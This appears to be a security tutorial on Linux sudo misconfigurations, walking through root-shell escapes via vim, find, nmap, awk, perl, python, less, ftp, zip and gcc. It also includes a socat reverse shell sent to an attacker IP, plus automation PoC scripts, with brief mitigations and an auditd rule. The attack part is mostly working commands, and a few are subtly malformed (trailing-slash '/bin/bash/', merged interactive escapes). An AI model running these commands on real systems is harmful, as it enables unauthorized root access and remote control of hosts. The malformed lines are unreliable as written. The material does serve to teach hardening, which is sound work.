### **1. Introduction**

`sudo` is a fundamental command in Linux that allows permitted users to execute commands as the root user or another user, as specified by the `sudoers` file. While its purpose is to enable safe privilege escalation, misconfigurations or oversights can introduce serious security risks, especially when users have unrestricted access to certain binaries. Here, weâ€™ll dive into how attackers can exploit these scenarios and what defenders can do to prevent them.

### **2. Exploit Techniques and In-Depth Explanations**

This section breaks down each privilege escalation technique. Each command provides insights into why it works and which `sudo` misconfigurations enable the exploit.

- Methods :
    
    ### 2.1.1 `vim`
    
    **Command:** `sudo vim -c ':!/bin/bash'`
    
    **Explanation:** `vim` can execute shell commands when invoked with `-c`. The command `:!/bin/bash` runs `/bin/bash` within the editor context, granting an attacker a root shell if `vim` is accessible with sudo.
    
    **PoC:**
    
    ```bash
    sudo vim -c ':!/bin/bash'
    ```
    
    **Mitigation:** Restrict `sudo` permissions for `vim` or use a secure path variable to prevent command execution within `vim`.
    
    ---
    
    ### 2.1.2 `find`
    
    **Command:** `sudo find / etc/passwd -exec /bin/bash \;`
    
    **Explanation:** The `find` command allows executing other commands on matched files using `-exec`. Here, it invokes `/bin/bash`, granting an attacker a shell with root privileges.
    
    **PoC:**
    
    ```bash
    sudo find / etc/passwd -exec /bin/bash \;
    ```
    
    **Mitigation:** Avoid granting `sudo` access to `find` without command restrictions.
    
    ---
    
    ### 2.1.3 `nmap`
    
    **Command:** 
    
    `echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse`
    
    **Explanation:** `nmap` can execute Lua scripts via the `--script` option. By writing a Lua script to open a shell, attackers can achieve privilege escalation.
    
    **PoC:**
    
    ```bash
    echo "os.execute('/bin/bash/')" > /tmp/shell.nse
    sudo nmap --script=/tmp/shell.nse
    ```
    
    **Mitigation:** Disable `nmap` as a `sudo` executable or use a restricted set of options to prevent external script execution.
    
    ---
    
    ### 2.1.4 `env`
    
    **Command:** `sudo env /bin/bash`
    
    **Explanation:** `env` allows running commands in a modified environment. By passing `/bin/bash`, attackers can escalate privileges if `env` is accessible with sudo.
    
    **PoC:**
    
    ```bash
    sudo env /bin/bash
    ```
    
    **Mitigation:** Remove `sudo` privileges for `env` to prevent unintended shell escalation.
    
    ---
    
    ### 2.1.5 `awk`
    
    **Command:** `sudo awk 'BEGIN {system("/bin/bash")}'`
    
    **Explanation:** The `awk` command allows running system commands. Using `sudo`, attackers can invoke a root shell by executing a bash shell.
    
    **PoC:**
    
    ```bash
    sudo awk 'BEGIN {system("/bin/bash")}'
    ```
    
    **Mitigation:** Restrict `sudo` permissions for `awk` or use limited privileges.
    
    ---
    
    ### 2.1.6 `perl`
    
    **Command:** `sudo perl -e 'exec "/bin/bash";'`
    
    **Explanation:** `perl` can execute system commands directly. By spawning a shell with `exec`, attackers gain a root shell.
    
    **PoC:**
    
    ```bash
    sudo perl -e 'exec "/bin/bash";'
    ```
    
    **Mitigation:** Limit `sudo` permissions for `perl`.
    
    ---
    
    ### 2.1.7 `python`
    
    **Command:** `sudo python -c 'import pty;pty.spawn("/bin/bash")'`
    
    **Explanation:** `python` can spawn interactive shells through `pty.spawn`. This method grants attackers a root shell.
    
    **PoC:**
    
    ```bash
    sudo python -c 'import pty;pty.spawn("/bin/bash")'
    ```
    
    **Mitigation:** Remove `sudo` privileges for `python` or enforce restricted permissions.
    
    ---
    
    ### 2.1.8 `less` and `man`
    
    **Commands:**
    
    - `sudo less /etc/hosts - !bash`
    - `sudo man man - !bash`
    
    **Explanation:** `less` and `man` can be exploited through their shell command escape sequences (`!`). Running these commands with `sudo` access allows an attacker to spawn a privileged shell.
    
    **PoC:**
    
    ```bash
    sudo less /etc/hosts - !bash
    
    sudo man man - !bash
    ```
    
    **Mitigation:** Avoid granting `sudo` access to `less` and `man`.
    
    ---
    
    ### 2.1.9 `ftp`
    
    **Command:** `sudo ftp - ! /bin/bash`
    
    **Explanation:** FTP clients like `ftp` allow running shell commands directly. Using `sudo`, an attacker can escape to a root shell with `!` commands.
    
    **PoC:**
    
    ```bash
    sudo ftp - ! /bin/bash
    ```
    
    **Mitigation:** Disable `ftp` with `sudo` or apply restricted shell environments.
    
    ---
    
    ## 2.2 Abusing Network Services with `socat`
    
    **Attacker Setup:**
    
    ```bash
    socat file:`tty`,raw,echo=0 tcp-listen:1234
    ```
    
    **Victim Command:**
    
    ```bash
    sudo socat exec:'sh -li' ,pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
    ```
    
    **Explanation:** `socat` can relay interactive shells over network connections. By pairing the attacker and victim machines, a root shell can be transferred remotely.
    
    **Mitigation:** Remove `socat` from `sudo` permissions to prevent shell forwarding.
    
    ---
    
    ## 2.3 Sudo-Based Archive Manipulation with `zip` and `gcc`
    
    ### 2.3.1 `zip`
    
    **Command:** `echo test > notes.txt; sudo zip test.zip notes.txt -T --unzip-command="sh -c /bin/bash"`
    
    **Explanation:** `zip` with `--unzip-command` allows executing commands when unzipping. This can be exploited to open a root shell.
    
    **PoC:**
    
    ```bash
    echo test > notes.txt
    sudo zip test.zip notes.txt -T --unzip-command="sh -c /bin/bash"
    ```
    
    **Mitigation:** Avoid `sudo` permissions for `zip`.
    
    ### 2.3.2 `gcc`
    
    **Command:** `sudo gcc -wrapper /bin/bash,-s .`
    
    **Explanation:** `gcc` allows wrappers to specify an executable. Here, `/bin/bash` is invoked instead of the intended wrapper, granting a privileged shell.
    
    **PoC:**
    
    ```bash
    sudo gcc -wrapper /bin/bash,-s .
    ```
    
    **Mitigation:** Do not grant `sudo` access to `gcc`.

### **3. Exploit Code Examples (PoCs)**

To automate these privilege escalations, here are some Proof-of-Concept scripts.

### **Example PoC for Automating `sudo find` Exploit**

```bash

#!/bin/bash
echo "Automating privilege escalation with sudo find"
sudo find / -exec /bin/bash \;

```

### **Example PoC for `nmap` NSE Exploit**

```bash

#!/bin/bash
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

```

> Disclaimer: Use these PoCs only in authorized, controlled environments. Unauthorized use is illegal and unethical.

### **4. Real-World Examples and Case Studies**

To illustrate the risk of `sudo` misconfigurations, here are anonymized examples from real-world scenarios:

- **Case Study: Misconfigured `sudoers` Permissions on a Production Server**
    - A company allowed users to run `/usr/bin/vim` as root, intending to let administrators edit configuration files. However, this opened a vulnerability where any user could escape to a root shell via `vim`.
    - An organization had misconfigured `sudoers` permissions, allowing all users to run `/usr/bin/find` as root. During a pentest, the tester escalated privileges by running `sudo find / -exec /bin/bash \;`.
- **CVE References**
    - For instance, CVE-2021-3156, known as "Baron Samedit," was a heap-based buffer overflow in `sudo` that allowed attackers to escalate privileges by exploiting the default configuration.

### **5. Detection and Mitigation Techniques**

Detecting and preventing these exploits requires monitoring and securing `sudo` privileges effectively.

- **Detection**:
    - **Auditd Rules**: Configure `auditd` to monitor for suspicious `sudo` usage. Example rule for tracking `vim` and `find`:
        
        ```bash
        -a always,exit -F path=/usr/bin/vim -F auid>=1000 -F auid!=4294967295 -k privilege_abuse
        ```
        
- **Mitigation**:
    - **Limit `sudo` Access**: Restrict access to potentially dangerous binaries (`vim`, `find`, `perl`).
    - **Use SELinux/AppArmor**: Implement policies to restrict binary execution.
    - **Review and Test `sudoers`**: Regularly audit `sudoers` configurations to detect misconfigurations.

By securing `sudo` configurations, administrators can greatly reduce the risk of privilege escalation.
